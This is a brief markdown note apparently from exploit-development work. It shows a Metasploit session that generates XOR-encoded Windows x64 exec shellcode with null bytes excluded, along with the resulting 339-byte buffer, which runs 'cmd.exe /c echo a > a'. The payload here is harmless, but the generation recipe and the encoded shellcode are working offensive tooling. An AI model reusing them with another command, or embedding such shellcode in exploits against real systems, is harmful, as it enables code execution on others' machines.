# createfile shellcode

```
> use payload/windows/x64/exec

msf6 payload(windows/x64/exec) > set cmd "cmd.exe /c echo a > a"
cmd => cmd.exe /c echo a > a
msf6 payload(windows/x64/exec) > generate -b "\x00"
# windows/x64/exec - 339 bytes
# https://metasploit.com/
# Encoder: x64/xor_dynamic
# VERBOSE=false, PrependMigrate=false, EXITFUNC=process,
# CMD=cmd.exe /c echo a > a
buf =
"\xeb\x27\x5b\x53\x5f\xb0\x3f\xfc\xae\x75\xfd\x57\x59\x53" +
"\x5e\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6\x66\x81\x3f" +
"\x04\x74\x74\x07\x80\x3e\x3f\x75\xea\xeb\xe6\xff\xe1\xe8" +
"\xd4\xff\xff\xff\x07\x3f\xfb\x4f\x84\xe3\xf7\xef\xc7\x07" +
"\x07\x07\x46\x56\x46\x57\x55\x56\x51\x4f\x36\xd5\x62\x4f" +
"\x8c\x55\x67\x4f\x8c\x55\x1f\x4f\x8c\x55\x27\x4f\x8c\x75" +
"\x57\x4f\x08\xb0\x4d\x4d\x4a\x36\xce\x4f\x36\xc7\xab\x3b" +
"\x66\x7b\x05\x2b\x27\x46\xc6\xce\x0a\x46\x06\xc6\xe5\xea" +
"\x55\x46\x56\x4f\x8c\x55\x27\x8c\x45\x3b\x4f\x06\xd7\x8c" +
"\x87\x8f\x07\x07\x07\x4f\x82\xc7\x73\x60\x4f\x06\xd7\x57" +
"\x8c\x4f\x1f\x43\x8c\x47\x27\x4e\x06\xd7\xe4\x51\x4f\xf8" +
"\xce\x46\x8c\x33\x8f\x4f\x06\xd1\x4a\x36\xce\x4f\x36\xc7" +
"\xab\x46\xc6\xce\x0a\x46\x06\xc6\x3f\xe7\x72\xf6\x4b\x04" +
"\x4b\x23\x0f\x42\x3e\xd6\x72\xdf\x5f\x43\x8c\x47\x23\x4e" +
"\x06\xd7\x61\x46\x8c\x0b\x4f\x43\x8c\x47\x1b\x4e\x06\xd7" +
"\x46\x8c\x03\x8f\x4f\x06\xd7\x46\x5f\x46\x5f\x59\x5e\x5d" +
"\x46\x5f\x46\x5e\x46\x5d\x4f\x84\xeb\x27\x46\x55\xf8\xe7" +
"\x5f\x46\x5e\x5d\x4f\x8c\x15\xee\x50\xf8\xf8\xf8\x5a\x4f" +
"\xbd\x06\x07\x07\x07\x07\x07\x07\x07\x4f\x8a\x8a\x06\x06" +
"\x07\x07\x46\xbd\x36\x8c\x68\x80\xf8\xd2\xbc\xf7\xb2\xa5" +
"\x51\x46\xbd\xa1\x92\xba\x9a\xf8\xd2\x4f\x84\xc3\x2f\x3b" +
"\x01\x7b\x0d\x87\xfc\xe7\x72\x02\xbc\x40\x14\x75\x68\x6d" +
"\x07\x5e\x46\x8e\xdd\xf8\xd2\x64\x6a\x63\x29\x62\x7f\x62" +
"\x27\x28\x64\x27\x62\x64\x6f\x68\x27\x66\x27\x39\x27\x66" +
"\x07\x04\x74"
```